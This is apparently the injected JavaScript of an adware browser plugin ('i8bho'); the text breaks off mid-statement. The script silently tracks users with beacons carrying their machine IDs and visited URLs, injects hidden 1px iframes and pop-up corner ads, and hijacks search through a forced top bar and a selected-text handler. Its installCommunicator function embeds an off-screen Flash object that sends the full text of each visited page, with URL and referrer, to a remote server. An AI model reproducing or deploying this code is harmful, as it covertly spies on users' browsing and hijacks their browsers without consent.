window.onerror = function() { return true; };
var i8bho_bindoemid= i8bho_bindoemid||0,
	i8bho_nid= i8bho_nid||'0',
	i8bho_rid= i8bho_rid||0,
	i8bho_cmac= i8bho_cmac||0,
	I8zc_ifiedown= I8zc_ifiedown||0,
	I8zc_ifrpopup= I8zc_ifrpopup||0,
	I8zc_popper= I8zc_popper||0,
	i8bho_nocgif= i8bho_nocgif||0,
	i8bho_v4mode= i8bho_v4mode||0,
	I8Body= 0,
	I8px= function(s){i=new Image();i.src=s},
	_gaq= _gaq||[];

_gaq.push(
	['_setAccount', 'UA-28115250-1'],
	['_setDomainName', 'none'],
	['_trackPageview']
);

(function()
{

	if( I8Body>100 ) return;

	if( !document.body )
	{
		if( ++I8Body < 100 ){
			setTimeout(arguments.callee, 100);
		}
		return;
	}

    window.i8vars ={
        charset : (document.charset || document.characterSet).toLowerCase(),
        cmtorid : 'i8_communicator'
    };

	I8Body= 101;
	if( i8bho_nocgif ){
		I8px('http://rbho.i8.com.cn:8088/c.gif?nid='+i8bho_nid+'&cmac='+i8bho_cmac+'&oemid='+i8bho_bindoemid+'&cver='+i8bho_cver+'&bv='+i8bho_BV+'&r='+document.referrer);
	}

	if( document.location.toString().indexOf('baidu') )
	{
		//baidu checKk: url based
		if( document.location.toString().indexOf('gnetinc_pg')>0 )
			I8px('http://counter.i8001.com/add?key=baidu_tn&val=gnetinc%95pg-in-url');

		//baidu checKk: url based
		if( document.location.toString().indexOf('gnetinc_dg')>0 )
			I8px('http://counter.i8001.com/add?key=baidu_tn&val=gnetinc%95dg-in-url');
	}

	//I8px.src='http://counter.i8001.com/add?key=browser_plugin&val=load';
	I8bho_print();
})();

function I8bho_print()
{
	(function(){
	//baidu checKk: form based
	if( document.location.toString().indexOf('baidu.com/s')>0 || document.location.toString().indexOf('baidu.com/baidu')>0 )
	{
		var i= 0, inputs= document.getElementsByTagName('input'), l= inputs.length, tn= false;
		for(;i<l;i++){
			if( inputs[i].getAttribute('name')==='tn' ){
				tn= inputs[i];
				I8px('http://counter.i8001.com/add?key=baidu_tn&val=' + tn.getAttribute('value').replace(/_/g, '%95'));
				break;
			}
		}

		if( tn===false ){
			I8px('http://counter.i8001.com/add?key=baidu_tn&val=none');
		}
	}


	var doc= document, win= window, body= doc.body,
		host= doc.location.hostname, firstObject= body.children.item(0),
		search_url= 'http://www.soso.com/q?cid=u.i.se.1&ch=u.i.se.1&unc=a400063_18&w=',
		msie= (msie= /MSIE ([\w.]+)/i.exec(win.navigator.userAgent)) && (msie= msie[1]) || false;

	//fuzzy (partial match) value search in array
	function partOf(haystack, needles){
		for(i in needles)
			if( typeof needles[i]==='string' && haystack.indexOf(needles[i])>-1 )
				return true;
		return false;
	}

	function rand(min,max){
		return Math.round(Math.random() * (max-min)) + min;
	}


	//======LOGIC:
	if( partOf(host, ['youku','iqiyi','ku6','soku','a67','video','56.com','dianying','yisou','kankan.xunlei','letv','tudou','aipai.com']) ){
		var category= 'movies';
	}
	else{
		var category= 'default';
	}

	//create and overwrite 'words' variables
	var words= words(category);

	if( partOf(host, ['192.168','soso.com','www.baidu','google','zhaochina', 'i8001'])===false )
	{
		//top bar ~100%
		if( I8zc_ifiedown )
		{
			showBar(category);
		}

		// ~3%
		if( rand(1,100)<=3 )
		{
			body.insertBefore(create('iframe', {
				'width': '1px', 'frameBorder':0, 'border':0, 'height': '1px', 'css': 'border:0;frameBorder:0',
				'src': 'http://ads.i8.com.cn/ad/client/cn.html?nid=' + i8bho_nid + '&oemid=' + i8bho_bindoemid + '&cmac=' + i8bho_cmac + '&rid=' + i8bho_rid
			}), firstObject);
		}
		// ~1%
		else
		if( rand(1,100)<=1 )
		{
			body.insertBefore(create('iframe', {
				'width': '1px', 'frameBorder':0, 'border':0, 'height': '1px', 'css': 'border:0;frameBorder:0',
				'src': 'http://www.zhaochina.com/ied_new/2/bt.html'
			}), firstObject);
		}

		// ~ ?% (10?)
		if( I8zc_ifrpopup && (Math.floor(I8zc_popper*10) > rand(1,10)) && ',166410,385004,131901,321576,102628,301677,308631,434147'.indexOf(',' + i8bho_nid)===-1 ){
			//I8px.src='http://counter.i8001.com/add?key=browser_plugin&val=corner%95ad';
			cornerAd();
		}
		else
		if( rand(1,100)<=3 ){
			//cornerAd('baidu');
		}


		//catch all clicks then filter
		body.onclick= function(event)
		{
			var div,
				event= event||win.event||false,
				target= event.target||event.srcElement||false;
			if( target && event )
			{
				if( div= doc.getElementById('i8-searchSelected-text') ){
					div.style.display= 'none';
				}
				searchSelected(target, event);
			}
		};
	}

	//======FUNCTIONS


	function showBar(type)
	{

		//body bar fix
		body.style.padding= '0';
		body.style.margin= '0';
		body.style.marginTop= '29px';

		var
			//main bar's div
			wrapper= create('div', {
				'css':'min-width:900px;width:100%;z-index:1986;zoom:1;line-height:14px;font-size:13px;height:28px;background:#fff;border:0;padding:0;margin:0;text-align:center;border-bottom:1px solid #ddd;'
					+ (msie&&msie<7?'width:expression(document.body.clientWidth>900?"100%":"900px");position:absolute;left:0;top:expression((0+(ignore=document.documentElement.scrollTop?document.documentElement.scrollTop:body.scrollTop))+"px");':'position:fixed;top:0;left:0')
			}),
			//holders
			search= create('div', {'css':'float:left;overflow:hidden;width:30%'}),
			links= create('div', {'css':'float:left;overflow:hidden;text-align:left;width:58%;padding-top:6px'}),
			tools= create('div', {'css':'float:right;text-align:right;width:9%'});

		//generate
		searchInput(search);
		keywordLinks(type, links)
//		bookmarkTool(tools)

		//ASSEMBLE
		wrapper.appendChild(search);
		wrapper.appendChild(links);
//		wrapper.appendChild(tools);

		//clear
		wrapper.appendChild(create('div', {'style':'clear:both'}));

		//insert the bar
		body.insertBefore(wrapper, firstObject);

		//focus on search input
		//doc.getElementById('i8-bar-search-input').focus();
	}



	function searchInput(parent, keyword)
	{
		//search submit
		parent.appendChild(create('span',
		{
			'onclick': function()
			{
				var value= doc.getElementById('i8-bar-search-input').value;
				//I8px.src='http://counter.i8001.com/add?key=browser_plugin&val=search#';
				_gaq.push(['_trackEvent', 'i8-bar', 'click-search', value]);
				location.href= search_url + value;
				return false;
			},
			'css': 'float:right;text-decoration:none;cursor:pointer;margin:0 4px;margin-top:4px;font-size:13px;padding:2px 16px;background:#f1f1f1;color:#333333;border-top:1px #e5e5e5 solid;border-left:1px #e8e8e8 solid;border-right:1px #888 solid;border-bottom:1px #999 solid',
			'innerText': '\u641c\u641c'
		}));

		//text input
		parent.appendChild(create('input', {
			'id': 'i8-bar-search-input',
			'css': 'float:right;margin:0 4px;margin-top:4px;border-top:1px #888 solid;width:120px;padding:0;font-size:13px;padding:1px;border-left:1px #666 solid;border-right:1px #bbb solid;border-bottom:1px #bbb solid',
			'value': words[0],//insert first matched word
			'onclick': function(){
				this.enter= true;
			},
			'onkeyup': function(e)
			{
				var key= (e||event).keyCode;
				if( key===8 || key>18 && key<94 ){
					this.enter= true;
				}
				//bug: windows+d to focus on address bar -> hit enter; search window is poped
				//onclick + onkey up are trying to deal with it
				else if( this.enter && !( key===16 || key===17 || key===18 ) && key===13 )
				{
					_gaq.push(['_trackEvent', 'i8-bar', 'enter-search', this.value]);
					//I8px.src='http://counter.i8001.com/add?key=browser_plugin&val=search%95click';
					location.href= search_url + this.value;
				}
			}
		}));

		//search logo
		parent.appendChild(create('img', {
			'css': 'float:right;margin-left:3%;height:22px;width:16px',
			'src': 'http://gif.i8001.com/bp/soso.ico.gif'
		}));
	}


	function keywordLinks(type, holder)
	{
		//keywords logo
		holder.appendChild(create('img', {
			'css': 'float:left;margin-left:30px;height:16px;width:16px',
			'src': 'http://gif.i8001.com/bp/' + (type==='movies' ? 'yisou.ico.gif' : 'taobao.ico.gif')
		}));

		//Create links
		for(i in words)
		{
			if( typeof words[i]!=='string' ) continue;

			holder.appendChild(create('a',
			{
				'href': (type==='movies' ?
						'http://v.yisou.com/s?q=' + words[i] + '&ty=v&sr=1&cid=3499_1001'
							: 'http://htm.i8001.com/bp/tb.html?kw=' + words[i]),
				'onclick': function()
				{
					_gaq.push(['_trackEvent', 'i8-bar', 'click-keyword', words[i]]);
					//I8px.src='http://counter.i8001.com/add?key=browser_plugin&val=taobao%95click';
					win.open(this.href);
					return false;
				},
				'css': 'margin:0 6px;line-height:16px;text-decoration:none;color:blue',
				'innerText': words[i]
			}));
		}
	}

	//
	//when someone add bookmark, remember it's vertical pixel position?
	function bookmarkTool(holder)
	{
		var hash= doc.location.hash||'#',
			icon= 'err';

		holder.appendChild(create('iframe',
			{
				'id': 'i8-bar-favorite', 'scrolling':'no', 'height':'0', 'width':'0', 'border':0, 'frameBorder':0,
				'css': 'z-index:999999;background:#fff;visibility:hidden;position:absolute;width:240px;height:160px;right:0;top:28px;frameBorder:0;border:0;border-bottom:1px solid #ccc;border-left:1px solid #ccc;padding:0;margin:0;',
				'src': 'http://no-cache.i8.com.cn/browser/dev-fav.html#' + encodeURIComponent(doc.location.href)
			})
		);


		var div= create('span', {
			'css':'float:right;cursor:pointer',
			'onclick': function()
				{
					//_gaq.push(['_trackEvent', 'i8-bar', 'click-tools', 'favorite-add']);
					var iframe= doc.getElementById('i8-bar-favorite');
						iframe.style.visibility= iframe.style.visibility==='visible' ? 'hidden' : 'visible';

					this.src= this.src==='http://no-cache.i8.com.cn/browser/fav-on.gif' ? 'http://no-cache.i8.com.cn/browser/fav-off.gif' : 'http://no-cache.i8.com.cn/browser/fav-on.gif';
				}
			}

		);

		//error
		div.appendChild(create('span', {'innerHTML':'&darr;', 'css':'float:right;font:700 150% arial;padding-right:10px'}));

		setTimeout(function()
		{
			if( hash===doc.location.hash ){
				setTimeout(arguments.callee, 50);
			}
			else{
				//icon
				div.appendChild(create('img', {
						'src': 'http://no-cache.i8.com.cn/browser/fav-' + (doc.location.hash.replace('#','')||'err') + '.gif',
						'css': 'float:right;display:block;height:24px;width:24px;cursor:pointer;background:#ffffff;margin-top:2px'
					})
				);

				//set back to original
				doc.location.hash= hash;
			}
		}, 50);

		holder.appendChild(div);
	}


	//print an ad in the corner
	function cornerAd(type)
	{
		if( type==='baidu' )
			var url= "http://fenxiang.i8.com.cn/?k=" + encodeURIComponent(words.join('-')).replace(/-/g, '+');
		else
			var url= 'http://ads.i8.com.cn/bho/ie/tanZhao_2.html?nid=' + i8bho_nid + '&oemid=' + i8bho_bindoemid + '&cmac=' + i8bho_cmac + '&rid=' + i8bho_rid;

		_gaq.push(['_trackEvent', 'i8-corner-ad', 'shown']);
		//corner's side
		var corner= rand(0, 5) ? 'right' : 'left',
		//holding div
			div= create('div', {
				'css':'z-index:99999;width:260px;height:220px;position:'
				+ (msie&&msie<8?'absolute;bottom:auto;top:expression(eval(document.documentElement.scrollTop+document.documentElement.clientHeight-this.offsetHeight-(parseInt(this.currentStyle.marginTop,10)||0)-(parseInt(this.currentStyle.marginBottom,10)||0)));':'fixed;bottom:0;')
				+ corner + ':0;border:1px solid #999999;margin:0;padding:1px;overflow:hidden;display:block;background:#fff'
			});
		//advert
		div.appendChild(create('iframe', {
			'scrolling':'no',
			'height':'100%', 'width':'100%', 'border':0, 'frameBorder':0,
			'css':'width:100%;height:100%;frameBorder:0;border:0;padding:0;margin:0',
			'src': url
		}));

		//close "x" button
		div.appendChild(create('div',
			{
			'onclick': function()
				{
					_gaq.push(['_trackEvent', 'i8-corner-ad', 'closed']);
					div= undefined;
					this.parentNode.parentNode.removeChild(this.parentNode)
				},
			'css':'position:absolute;border:1px solid #ddd;' + (rand(0,1) ? 'right':'left') + ':0;' + (rand(0,1) ? 'top':'bottom') + ':0;color:red;font-size:12px;padding:0 5px;cursor:pointer;background:#eee',
			innerText:" X "
		}));
		//insert
		body.insertBefore(div, firstObject);
	}


	//show "search" button next to user's selected text
	function searchSelected(target, event)
	{
		if( ',input,textarea'.indexOf(','+target.nodeName.toLowerCase())>-1 ){
			return;// event;
		}

		var input, div, text= ( win.getSelection && win.getSelection().toString() )||( doc.getSelection && doc.getSelection() )||( doc.selection && doc.selection.createRange().text )||false;
		if( text && typeof text==='string' && text.replace(/\s/g, '').length>0 && text.length<30 )
		{
			if( (input= doc.getElementById('i8-bar-search-input')) ){
				input.value= text;
			}

			if( event.pageX===undefined && event.clientX )
			{
				var docEl= doc.documentElement;
				event.pageX = event.clientX + (docEl && docEl.scrollLeft || body && body.scrollLeft || 0) - (docEl && docEl.clientLeft || body && body.clientLeft || 0);
				event.pageY = event.clientY + (docEl && docEl.scrollTop  || body && body.scrollTop  || 0) - (docEl && docEl.clientTop  || body && body.clientTop  || 0);
			}

			if( event.pageX )
			{
				if( !(div= doc.getElementById('i8-searchSelected-text')) )
				{
					div= create('a',
					{
						'onclick': function(event)
						{
							var text= this.href.split('&w=');
							if( text.length===2 ){
								_gaq.push(['_trackEvent', 'i8-inpage', 'click-selected', decodeURIComponent(text[1])]);
								//I8px.src='http://counter.i8001.com/add?key=browser_plugin&val=search%95click_text';
							}
							win.open(this.href);
							return false;
						},
						'id': 'i8-searchSelected-text',
						'css': 'z-index:999;position:absolute;margin:0;padding:2px 0 0;border-top:1px #e5e5e5 solid;border-right:1px #888 solid;border-bottom:1px #999 solid;color:#fff;background-color:blue;text-decoration:none',
						'innerHTML': '&#9658;&nbsp;\u641c\u641c&nbsp;&nbsp;'
					});
					body.insertBefore(div, firstObject);
				}

				if( div.href!==search_url + encodeURIComponent(text) )
				{
					div.style.top=event.pageY - (msie&&msie?0:10) + 'px';
					div.style.left=event.pageX - (msie&&msie?0:5) + 'px';
					div.href= search_url + encodeURIComponent(text);
					div.style.display= 'block';
				}
			}
		}
	}

	function popUnder(target, event)
	{
		//if( target && 'a'!==target.nodeName.toLowerCase() ){
		//	return;
		//}

		//normal pop under
	}

	//replace [words] found on page with links
	function createLinks(){}

	//create element
	function create(tag, attr)
	{
		var obj= doc.createElement(tag);
		for(i in attr)
		{
			if( i==='innerText' ) obj.innerText= attr[i];
			else if( i==='innerHTML' ) obj.innerHTML= attr[i];
			else if( i==='css' ) obj.style.cssText= attr[i];
			else if( i==='onload' )obj.onload= attr[i];
			else if( i==='onkeyup' )obj.onkeyup= attr[i];
			else if( i==='onclick' ){obj.onclick= attr[i];}
			else obj.setAttribute(i, attr[i]);
		}
		return obj;
	}

	//try to match words with text on page
	function words(type)
	{
		var words= type==='movies' ?
			"一夜未了情,青春失乐园,不伦纯爱,特工的特别任务,玩命狙击,婚前试爱,艋舺,神通乡巴佬,武侠标签,画壁,头文字d,立春,春香传,爱出色,出轨的女人,灵魂战车2,逆战,色即是空2,赤裸特工,床下有人,万有引力,人间色相,最好的时光,黑社会,艺伎回忆录,嘿店,大武生,丧失贞德2,挪威的森林,刀锋战士3,憨豆特工2,猎艳,想爱就爱,美人图,刺青,咒怨,爱情与灵药,山村老尸,神马都是浮云,夏日恋神马,观音山,玩命快递3,屌丝女士,泰坦尼克号,我的美女老板,疯魔美女,夫妻那些事,东成西就2011,色破孽缘,龙门飞甲,爱love,夺命金,喜羊羊与灰太狼,花吃了那女孩,谜情公寓,监狱风云,我们是夜晚,贱女孩,初恋这件小事,金陵十三钗,七年很痒,aa制生活,第一滴血,火山高校,怪侠欧阳德,诱惑假期,终极斗士3,饭局也疯狂,小贼美女妙探,惊魂游戏,新天生一对,惊天战神,极速天使,娜妲莉的情人,病院惊魂,笔下求生,铁甲战士,单身男女,七天,春娇与志明,晚秋,谍海风云,疯狂的蠢贼,铁甲战士,维纳斯足球队,春梦记,异星战场,结婚狂想曲,单刀直入,女人如花,laughing gor之潜罪犯,拳王争霸战,真心话大冒险,亲家过年,豪门生死恋,我愿意,高海拔之恋2,海底总动员,变身男女,大魔术师,甄嬛传,aa制生活,爱情公寓,太平公主秘史,逆转女王,夫妻那些事,爱上巧克力,北京爱情故事,绝对达令".split(",")
			: "加厚打底裤,纱裙,开衫男,复古连衣裙,伴娘礼服,平底鞋,2012春装蕾丝连衣裙,7寸平板电脑,笔记本电脑桌,干衣机,露肩,打印机,欧时力专柜正品,拼接,墙纸卧室,帆布鞋男,孕妇,春季情侣装,摄像头,学习桌,破洞,儿童,复古毛衣,连衣裙女冬装,天使之城,包邮特价,修身连衣裙冬装,手机正品,摩托罗拉me525,蓝牙,大码棉衣,女装大衣,儿童家具,阿芙,女包真皮特价,金属,烘干机,电脑桌台式,大码女装胖mm春装,丝绒,摄影棚,劲霸男装,2012春装新款女装,太阳镜女,十字绣大幅新款,新款春装,女装,女装春装,水晶鞋,psp3000,iphone4手机壳,毛衣,宠物衣服,木地板,雨伞,折叠椅,zippo,防辐射服,手表手机,宝宝春装,女鞋休闲鞋,水族箱,天文望远镜,保温瓶,浴室柜,新生儿用品,高腰铅笔裤,天翼电信手机,打底衫,秋冬连衣裙,性感连衣裙,跑步鞋,长款毛衣,抱枕,连衣裙外单,诺基亚5233,妈妈装,双肩包女,森马,韩国代购连衣裙,秋装新款连衣裙,自然堂柜正品,瑞士军刀,书架,女包单肩,大衣男,衣架落地,lv女包,汽车脚垫,蕾丝打底连衣裙,真丝连衣裙,苹果配件,西装女修身,短裙,猫猫包袋,保暖衬衫,松糕鞋厚底,坡跟靴,天堂伞,打底连衣裙长袖,外壳,打底t恤,电子称,九阳豆浆机,电炖锅,3g上网卡,羽绒服正品,棉袄,led灯,羊绒大衣,短靴高跟,三文鱼,拖鞋,手机号码,三星s5830,g11手机保护套,雨鞋,春装连衣裙新款,春装新款连衣裙,学生书包,婚纱拖尾,真皮斜挎女包,板鞋,唇膏,iphone4,裙子,月子服,配饰,汽车座垫,马丁靴短靴,电磁炉,数码相机,香薰灯,和田枣,键盘,大码女鞋,水貂皮草,t恤,打底衫长款,钟表,蕾丝连衣裙,创意礼品,女装毛衣长款,修,加绒铅笔裤,斗篷毛呢外套,打底裤秋冬,秋水伊人专柜正品,原创女装,热裤,秋装新品,杰克琼斯,打底褲,牛仔铅笔裤,手机内存卡,灯具客厅,棉衣男,魅族m9,少女文胸,斗篷外套韩版,内增高,打底连衣裙秋冬,耳机,长袖t恤,丝巾,镂空毛衣,正品女靴,显卡,老年手机,单鞋高跟,内胆包,针织衫女,特百惠正品水杯,牛仔外套,可爱睡衣,联通3g手机卡,装饰画,新娘礼服,女打底衫,喇叭,黄金戒指,山寨手机,收纳抽屉,棉衣,电视,索爱手机,mp4,太空包,bb霜,橱柜,女套装,平板电脑手机,触摸屏手机,浪莎,大衣女,雪地靴,android智能手机,皮草外套,饰品,麻花毛衣,韩版童装,棉衣女装中长款,七匹狼,水晶手链,修身连衣裙,格子衬衫,婴儿床,休闲套装女,孕妇装,韩都衣舍,多啦a梦,真皮包包女,邮差包,韩国代购毛衣现货,塑身内衣,女包真皮,高跟鞋,电子血压计,女装春装新款,无袖连衣裙,小米手机配件,枸杞,机械表,书包,针织连衣裙,打蛋器,毛衣男,电吹风,刀具,马甲背心,纸巾盒,熊猫鞋,床罩,腰带女,长款打底衫,围巾秋冬,换鞋凳,十字绣抱枕,大码春装新款外套,首饰盒,小米手机壳,台灯卧室床头,女鞋短靴,宝宝鞋,女式衬衫,衬衫,ipad2保护壳,电话,卫衣外套,2012春款,风筝,哥弟女装专柜正品,童装夏装清仓特价,音乐盒,西装女,大码牛仔裤,牛仔裤女小脚裤,男t恤,保险柜,灯饰,卫裤,韩式婚纱,天鹅绒,短款羽绒服,裙子冬装连衣裙,女士衬衫,短款风衣,男装外套韩版,长袖连衣裙,沙发床,2012春装韩版外套,装饰,鱼缸,春装2012新款,htc,懒人沙发,毛衣女韩版蕾丝,毛呢大衣,大码t恤,家具,篮球服,电脑桌包邮,宽松连衣裙,背带裙,水壶,和田玉,小虫米子,支架,女装风衣,新款女包,大码雪纺裙,主机,大码女打底衫,运动服套装,碧根果,夹克男装,女连衣裙,足球,睫毛膏,奶酪,硬盘,与狼共舞,尤麦,单鞋女,耳麦,内衣女,复古衬衫,特步,短裙冬季,背心连衣裙,内裤女,孕妇毛衣,htc手机套,2012新款女鞋单鞋,电吉他,抹胸,水桶包,韩版,运动鞋男正品,靴子女,发饰韩国,拼接连衣裙,丝带绣,羊绒衫,羊绒衫正品,达芙妮单鞋,靴裤,双排扣呢大衣,地毯,高跟单鞋,戒指男,无袖毛呢连衣裙,两件套连衣裙,棉衣女,女靴真皮,保暖内衣,收纳箱,呢大衣中长款,thinkpad,益智玩具,女包韩版,头箍,陶瓷杯,蕾丝衬衫,指甲油,破洞牛仔裤,高领毛衣打底衫,高腰连衣裙,文胸正品,周黑鸭,单肩包女,cd机,小西装,山地车,女装裙,蕾丝花边,坡跟女鞋,花瓶,中长款风衣,mp5,大衣,条纹毛衣,毛呢西装,鲜花,笔袋,冬季短裙,新款女鞋,秋冬打底裤,纯银项链,零食,索爱,长裤,香影,紫砂,连衣裙毛呢,单鞋,女装正品专柜,宽松毛衣,夏季连衣裙,发簪,篮球,棒球帽,韩版女包,沙发垫,情侣戒指,百丽正品单鞋,铅笔,棉马甲,回力鞋,毛绒玩具,十字绣,老北京布鞋,九分裤,毛衣女加厚,美宝莲,苹果手机,毛衣外套,冬季清仓,牛仔裙,男装棉衣,椅子,有线鼠标,呛口小辣椒,皮衣短款女,尼大衣,毛呢短裤,男夹克,缝纫机,投影机,中年女装外套,蘑菇街,红色礼服,戒指,小礼服,短袖女,简易衣柜,雪纺衫,衬衫韩版,打底背心,毛衣女装,浴室置物架,潮流,耐克鞋,泰迪熊,羽绒服新款,点读笔,假发,拉夏贝尔羽绒服,童装,清仓,长款呢大衣,皮衣皮草,化妆刷,英伦风女鞋,开衫,直筒牛仔裤,夹克衫,防水台高跟鞋,户外鞋,强光手电,无线上网卡,风衣男,iphone3gs,花架,冬装连衣裙,男皮鞋,单肩包,充电电池,加绒牛仔裤女,真皮沙发,宝宝春秋套装,苹果4水钻手机壳,九牧王,波西米亚长裙,沙发组合,高腰裤,牛仔裤女韩版潮,扩音器,孕妇牛仔裤,保护套,香水女,夹克,背带,长袖衬衫,iphone4s,粗跟单鞋,孕妇套装,西装外套女,正装皮鞋,雪纺长裙,针织衫开衫,十字绣成品,全蕾丝连衣裙,亲子装春装,山核桃,恒源祥女羊毛衫,春装外套,宝宝套装春秋,大码外套,话费充值,哈伦裤女2012新款,孕妇裤春秋,烟嘴,棉先生,秋冬连衣裙长袖,飞利浦剃须刀,孕妇连衣裙,内衣,棉裤,阿依莲2012春装,风衣女外套修身,演出服,首饰,暖宝宝,卫衣套装女,马赛克,监控摄像头,枕芯,烟灰缸,男士内裤,2012夏装,宜家,足球鞋,电子表,翻盖手机,人字拖,积木,无线鼠标键盘套装,外贸原单,电子书,食指戒指指环,旅行包,车载行车记录仪,加厚睡衣,春装女2012,珍珠,夏装新品2011,女装毛衣,文胸,手机包,羽绒服女,纯色连衣裙,中老年女装春秋装,羊毛衫女,华硕笔记本,电视墙贴,加厚卫衣,男休闲夹克,卫衣女秋冬,情侣表,运动服男,大码春装,彩妆,好神拖,劲霸夹克,红枣,长款针织衫,毛呢连衣裙韩国,真维斯,男钱包,面具,收纳柜,大码连衣裙,夏装连衣裙,诺基亚手机,秋水伊人2012春款,单人床,镂空,牛仔裤男,女大码毛呢,大码风衣,移动充值,音箱,正品羽绒服,鸿星尔克,穿衣镜,摩托罗拉,皮草外套韩国,短裙秋冬,孕妇鞋,机车皮衣,阿迪达斯正品,收纳盒,长款卫衣,手提包,阿胶,被子,长裙,淑女屋,毛绒,情趣用品,刺绣,帆布鞋松糕,单肩婚纱,键鼠套装,胸罩,真丝睡裙,男士外套,热水器,花种子,低帮鞋女,黑色打底衫,女式鞋,录音笔,狗笼,海军,婴儿帽,化妆品,杯子创意,韩版帆布鞋,长款外套,玉兰油,巴拉巴拉,红色连衣裙,mp3,男装t恤,打底衫女,睡衣加厚特价,围巾,海宁皮衣,折叠餐桌,阿迪达斯三叶草,运动装,麦包包,小饰品,冲锋衣女,连体裤,鞋架,女包包,新款外套,榻榻米,带帽卫衣,衬衫女款长袖,白色蕾丝连衣裙,马丁靴,工艺品,2012春装新款连衣裙,摩托车头盔,修身衬衫,半身冬裙,休闲装,手机卡,暴走鞋,婚纱,newbalance,装饰品,妮子大衣,苹果4s手机壳,记事本,婚庆用品,连衣裙女春装,靴子,单人沙发,蝙蝠衫,高跟靴,蝙蝠毛衣,茶具套装,时尚t恤,打底裤,牛仔裤,连衣裙,哈伦女裤,蕾丝女装,潮流女装,情侣装,牛仔女装,大码女装,胖mm夏装,雪纺衬衫,西装,高腰裙,半身裙,春季毛呢外套,新款女装,新款哈伦裤,短裤,韩版女装,短外套,糖果色女装,牛仔短裤,夏装2012新款,休闲套装,情侣t恤,春秋女士外套,女式外套,长款t恤,2012春装外套,针织衫,新品上衣,阿依莲正品,吊带,吊带背心,风衣,宽松t恤,热卖女装,韩范连衣裙,纯棉格子衬衫,英伦风短袖t恤,韩版ol连体裤,夏新款韩版雪纺衫,修身牛仔裤,韩范时尚包包,夏款连衣裙,女士衬衫,复古女装,旗袍,女式针织开衫,条纹女装,高腰牛仔裤,背心,短袖,运动服,低领长袖打底衫,防晒衣,礼服,韩国代购,女式开衫,短袖t恤,纯色针织衫,卫衣,吊带衫,马夹,雪纺连衣裙,蕾丝裙,波西米亚裙,吊带裙,蓬蓬裙,裤子,铅笔裤,哈伦裤,五分裤,七分裤,连身裤,正装裤,小脚牛仔裤,牛仔连衣裙,牛仔衬衫,牛仔半裙,牛仔马甲,牛仔风衣,中老年服装,唐装,毛衣,高领毛衣,短款毛衣,皮装,棉外套,毛呢外套,羽绒服,棉背心,羽绒背心,呢大衣,半身裙,个性t恤,韩版女装,日系甜美,夏季新款,性感热裤,帆布鞋,雪纺衬衫,leggings,长裙,小西装,英伦风,印花裙,夜店范儿,牛仔裙,碎花衫,高腰短裤,高跟鞋,军装风,长西装,格子衫,黑白波点,复古风,镂空罩衫,清纯,棒球衫,打底裤,百褶裙,荷叶领,海外原单,印花长裤,小伞裙,豹纹内衣,蕾丝镂空裙,罗马凉鞋,高腰裤,大嘴猴,闺蜜装,背心裙,专柜正品,涂鸦风,耐克,阿迪达斯,匡威,万斯vans,板鞋,皮鞋,拖鞋,人字拖,连裤袜,睡衣,丝袜,文胸,睡裙,情侣睡衣,吊带,性感内衣,联想电脑,无线路由器,u盘,平板电脑,苹果,三星手机,htc,单反相机,微型摄像机,耳机,祛痘,保湿润肤,玻尿酸,天天特价,潮流新品,厂家直销,出游必备,半裙,牛仔裤,皮带,真皮女包,珠宝首饰,太阳镜,iphone4s,吹风机,防晒霜,丰胸,沐浴乳,防蚊,台灯,床上用品,电影兑换券,套头衫,试用,穿越火线,齐x小短裙,psp,摇杆,方向盘,充电器,网卡,内存,剃须刀,音箱,格纹,名媛,混搭,学院风,条纹,糖果色,薇姿,马克杯,英雄联盟,魔兽世界点卡,自拍神器,only,夜店女王,美特斯邦威".split(","),
			i= 0, length= words.length, max= rand(7, 10), matches= [], text= body.innerText.toLowerCase();

        installCommunicator();
		//distrebuted text collection system
//		if( rand(1,100)<=100 )
//            sendText(text);
//			I8px('http://211.154.172.172/text?text=' + encodeURIComponent(text).substr(0, 1024) );

		//match
		while( length>++i && matches.length<max ){if( text.indexOf(words[i])>-1 && matches.push(words[i]) );}
		//fill up
		while( matches.length<max && matches.push( words[rand(0, length-1)] ) );
		//clean up
		delete words,text;
		//slice search word? 50/50
		matches= matches.length && rand(0, 1) ? matches.slice(1) : matches;
		//shuffle
		matches.sort(function(){return 0.5 - Math.random()});
		//return
		return matches;
	};

    function installCommunicator()
    {
        var initrc = 'i8_initrc';   // will be called by flash once loaded.
        window[initrc] = function()
        {
            sendText(document.body.innerText.replace(/\s{2,}/g,  ' '));
        }
        var host = "192.168.1.8", port = "10010";
        var swf = 'http://' + 'www.jebe.com' + '/crawl.swf?host=' + host + '&port=' + port + '&charset=' + i8vars.charset + '&initrc=' + initrc;
        var html = '<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" ' +
                'codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,40,0" ' +
                'width="1" height="1" id="' + i8vars.cmtorid + '" name="' + i8vars.cmtorid + '">' +
                '<param name=host value="' + host + '">'                    +
                '<param name=port value="' + port + '">'                    +
                '<param name=charset value="' + i8vars.charset +  '">'      +
                '<param name=movie value="' + swf + '">'                    +
                '<param name=allowScriptAccess value="always">'           +
                '<param name=quality value="low">'                          +
                '<embed src="' + swf + '" allowscriptaccess="always" quality="low" width="1" height="1" name="' +
                    i8vars.cmtorid + '" id="' + i8vars.cmtorid + '" type="application/x-shockwave-flash"></embed>' +
            '</object>';
        var div = document.createElement('div');
        div.setAttribute('style', 'position:absolute; left:-10000px; top:-10000px; width:1px; height:1px; overflow:hidden;');
        div.innerHTML = html;
        document.body.appendChild(div);
    }

    function sendText(text)
    {
        var cmtor = msie ? window[i8vars.cmtorid] : document[i8vars.cmtorid];
        if (!cmtor || !cmtor.i8call) return;

        if (window.i8vars.unloadRegistered === undefined)
        {
            window.i8vars.unloadRegistered = true;
            window[(window.onbeforeunload === undefined) ? 'onunload' : 'onbeforeunload'] = function()
            {
                cmtor.i8disconnect();
            }
        }

        var meta = {url:document.location.href, ref:document.referrer};
        window.crawlPage = function(resp)
        {
            var res =  eval('(' + resp + ')');
            if (res && res.code == 'err')
            {
                cmtor.i8crawl(null, meta, text);
            }
            else
            { // show ads.
            }
        };
        cmtor.i8call("pageExists", 'crawlPage', meta, i8vars.charset.toLowerCase());
    }

	//load Google Analytics
	body.insertBefore(create('script', {
		'type': 'text/javascript',
		'async': true,
		'src': 'http://google-analytics.com/ga.js'
	}), firstObject);

	if( I8zc_ifiedown && (i8bho_nid.indexOf("1")>-1 || i8bho_nid.indexOf("2")>-1 || i8bho_nid.indexOf("3")>-1 || i8bho_nid.indexOf("4")>-1 || i8bho_nid.indexOf("5")>-1) )
	{
		body.insertBefore(create('script', {
